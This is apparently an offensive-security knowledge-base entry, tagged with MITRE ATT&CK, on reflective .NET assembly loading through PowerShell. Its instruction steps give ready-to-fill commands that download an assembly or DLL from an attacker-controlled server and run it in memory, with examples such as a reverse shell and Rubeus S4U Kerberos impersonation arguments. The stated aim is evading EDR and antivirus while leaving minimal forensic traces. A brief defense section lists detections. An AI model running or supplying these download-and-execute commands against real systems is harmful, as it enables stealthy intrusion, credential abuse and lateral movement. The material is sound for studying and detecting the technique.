---
id: ec45d777-3be1-4bec-a458-66a559af68a1
name: Reflective-Assembly-Loading-with-PowerShell
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:24.089475+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques:
  - '[[sub-techniques/PowerShell|T1059.001 - PowerShell]]'
tags:
  - '[[tags/Reflective-Loading]]'
  - '[[tags/PowerShell]]'
  - '[[tags/Assembly-Execution]]'
commands:
  - '[[commands/powershell-download-and-run-assembly-without-arguments]]'
  - '[[commands/powershell-download-and-run-rubeus-with-arguments]]'
  - '[[commands/powershell-execute-specific-method-from-assembly]]'
platforms:
  - Windows
tools: []
validated: true
---

# Reflective-Assembly-Loading-with-PowerShell

## Summary

This procedure demonstrates how to load and execute C# assemblies and DLLs reflectively using PowerShell, avoiding disk writes to bypass endpoint detection and response (EDR) solutions that monitor file system activity. It covers downloading assemblies from a remote URL, loading them into memory, and invoking entry points or specific methods without dropping files on the target system.

## Description

Reflective assembly loading allows attackers to execute .NET code entirely in memory by using PowerShell to fetch binary data over the network, load it via System.Reflection.Assembly, and directly invoke types and methods. This technique is effective in Windows environments for evading antivirus and EDR tools that rely on file-based signatures or behavioral monitoring of disk I/O. The procedure targets scenarios where an attacker has initial PowerShell execution capability, such as through a compromised account or initial access vector, and needs to run tools like Rubeus or custom payloads without persistence on disk. Expected outcomes include successful code execution, such as spawning a reverse shell or performing lateral movement, while minimizing forensic artifacts.

## Requirements

1. PowerShell execution access on a Windows target system (version 2.0 or later).
2. Network connectivity from the target to the attacker's controlled server hosting the assembly/DLL files.
3. Knowledge of the assembly's namespace, class, and method names for invocation (for non-entrypoint executions).
4. No additional tools required beyond built-in .NET Framework classes.

## Defense

- Implement constrained PowerShell execution policies and enable Script Block Logging to monitor reflective loading attempts.
- Use application whitelisting (e.g., AppLocker or WDAC) to restrict unsigned code execution.
- Monitor network traffic for unusual downloads of .NET executables and PowerShell processes making HTTP requests.
- Deploy EDR solutions with memory scanning capabilities to detect in-memory assembly loads.

## Objectives

1. Download and load a C# assembly into memory without writing to disk.
2. Execute assembly entry points or specific methods reflectively to achieve code execution goals.
3. Bypass file-based detection mechanisms for stealthy post-exploitation activities.

## Instructions

### Step 1: Download and Run Assembly Without Arguments

**Context**: This step fetches a simple executable assembly (e.g., a reverse shell) from a remote URL, loads it reflectively, and invokes its main entry point. Use this for assemblies without command-line parameters.

**Command** ([[commands/powershell-download-and-run-assembly-without-arguments]]):

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('$_ASSEMBLY_URL')
$assem = [System.Reflection.Assembly]::Load($data)
[$_NAMESPACE.$_CLASS]::$_ENTRY_METHOD()
```

This command downloads the assembly bytes, loads them into memory, and calls the specified entry method (e.g., Main()). Replace placeholders with actual values. Expected output depends on the assembly, such as a reverse shell connecting back or console output from the program.

### Step 2: Download and Run Rubeus with Arguments

**Context**: For tools like Rubeus that require parameters (e.g., for Kerberos attacks), this step downloads the executable, loads it, and passes split arguments to the main method. This enables advanced post-exploitation without disk writes.

**Command** ([[commands/powershell-download-and-run-rubeus-with-arguments]]):

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('$_ASSEMBLY_URL')
$assem = [System.Reflection.Assembly]::Load($data)
[$_NAMESPACE.$_CLASS]::$_ENTRY_METHOD($_ARGUMENTS.Split())
```

Invoke the command with the tool's URL and arguments as a space-separated string. For example, for Rubeus S4U, use arguments like "s4u /user:target$ /rc4:hash /impersonateuser:admin /msdsspn:service /ptt". Success is indicated by the tool's output, such as ticket generation or error messages.

### Step 3: Execute Specific Method from an Assembly

**Context**: When dealing with DLLs or assemblies where only a specific method needs invocation (e.g., a payload runner), this step loads the DLL and dynamically calls the method using reflection. Useful for modular payloads.

**Command** ([[commands/powershell-execute-specific-method-from-assembly]]):

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('$_DLL_URL')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("$_NAMESPACE.$_CLASS_NAME")
$method = $class.GetMethod("$_METHOD_NAME")
$method.Invoke($_INSTANCE, $null)
```

Specify the DLL URL, full class name, and method name. The invoke uses a null instance for static methods or 0 for instance methods as in the example. Expected output is the method's execution result, such as spawned processes or network activity.
